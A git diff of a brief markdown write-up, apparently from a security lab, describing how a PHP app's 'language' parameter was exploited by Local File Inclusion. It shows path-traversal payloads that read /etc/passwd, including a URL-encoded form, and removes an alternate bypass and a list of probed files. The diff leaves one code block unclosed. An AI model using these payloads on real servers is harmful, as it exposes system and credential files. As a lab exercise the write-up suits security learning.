@@ -1,13 +1,12 @@
 # Local File Inclusion (LFI)
 
 ##  What I Did
-Exploited a PHP web application by abusing the `language` parameter to access restricted server files like `/etc/passwd`. This confirmed a **Local File Inclusion (LFI)** vulnerability.
+Exploited a PHP web application by abusing the parameter to access restricted server files. This confirmed a **Local File Inclusion (LFI)** vulnerability.
 
 ---
 
 ##  Tools Used
 - LFI vulnerable site
-- Browser (manual payload testing)
 - Burp Suite (for request manipulation & encoding)
 - Online Encoders (for obfuscating traversal attempts)
 
@@ -21,11 +20,6 @@ Exploited a PHP web application by abusing the `language` parameter to access re
 ##  Steps
 
 ### 1. Found the vulnerable `language` parameter
-
-Legit request:
-```
-http://94.237.121.185:33465/index.php?language=en.php
-```
 
 Injected traversal payload:
 ```
@@ -41,21 +35,10 @@ http://94.237.121.185:33465/index.php?language=../../../../etc/passwd
 URL encoded:
 ```
 .../index.php?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd
-```
 
-Alternate directory traversal:
 ```
-.../index.php?language=....//....//....//etc/passwd
-```
-
----
 
 ### 3. Explored More Sensitive Files (optional)
-
-Tested for:
-- `/proc/self/environ`
-- `/etc/hostname`
-- Application-specific `.log` files
 
 Some returned useful debugging and environment variables.
 
